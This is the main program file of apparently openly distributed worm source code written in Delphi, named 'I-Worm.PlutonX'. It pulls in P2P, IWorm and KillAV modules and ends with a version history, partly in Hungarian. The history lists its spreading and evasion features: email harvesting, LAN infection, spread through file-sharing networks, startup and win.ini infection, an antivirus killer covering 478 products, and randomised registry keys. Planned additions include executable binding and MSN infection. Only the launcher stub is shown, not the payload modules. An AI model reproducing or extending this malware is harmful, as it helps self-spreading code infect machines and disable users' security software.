   PROGRAM PlutonX;

   USES
     Forms,
     Windows,
     P2P in 'P2P.PAS',
     IWorm in 'IWorm.PAS',
     KillAV in 'KillAV.PAS';

   VAR
     hMutex : THandle;

   {$R *.RES}

   BEGIN
     hMutex:=CreateMutex(NIL,False,'I-Worm.PlutonX');
     IF WaitForSingleObject(hMutex,0)<>wait_timeout THEN BEGIN
       Application.Initialize;
       Application.Title:='';
       Application.CreateForm(TForm1, Form1);
     Application.Run;
     END;
   END.

   //History
   //
   //I-WORM.SOLTERN.E:
   // - New Bigman File
   // - ?,%,$,: Caracters Detection In Email Adresses
   // - Check Morpheus Software Exists
   // - Timer Disabled On First Run
   // - Hide Aplication Name In Main Form
   //
   //I-WORM.SOLTERN.F:
   // - Only One Virus Can Start
   // - Infect Startup Directories
   // - Infect win.ini
   // - New Icon
   // - Kazaa Registry Bug Fixed
   // - BigMan File Removed
   // - Delphi 4 Compatible
   //
   //I-WORM.SOLTERN.G:
   // - LAN Infection (With TThread)
   // - Morpheus II and Kazaa 2.0 support
   // - AV Killer (Detect 478 AntiVirus Softwares)
   // - Support eDonkey 2000, XoloX, Shareaza, LimeWire
   // - Random File Names
   // - NO Error Message When Worm Run In StartUp Dir
   // - Random Error Messages
   // - Random Registry Keys
   // - Random DNS
   //
   //TERVEK:
   // - Exe fertozes (Binder)
   // - File meret veletlenszeru valtoztatasa
   // - File Search + Clone in shared folders
   // - Registry allando csekkolasa
   // - MSN Fertozes
   // - Kepernyovedo megfertozese
   // - Titkositott string-ek
